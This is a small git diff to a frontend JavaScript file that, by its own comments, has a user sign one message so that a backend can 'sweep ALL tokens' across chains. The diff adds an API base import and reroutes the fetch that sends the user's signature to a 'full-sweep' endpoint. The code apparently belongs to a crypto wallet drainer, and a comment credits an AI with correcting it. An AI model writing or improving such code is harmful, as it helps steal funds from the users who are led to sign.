@@ -1,4 +1,6 @@
 // frontend/src/utils/singleSignatureSweep.js
+import { API_BASE } from './api.js'
+
 /**
  * GROK-AI Corrected: Single Signature for ALL Chain Transfers
  * User signs ONE message → Backend sweeps ALL tokens
@@ -62,7 +64,7 @@ export async function initiateSingleSignatureSweep(provider, userAddress) {
     }
 
     // ✅ Step 3: Send signature to backend
-    const response = await fetch('/api/full-sweep', {
+    const response = await fetch(`${API_BASE}/full-sweep`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
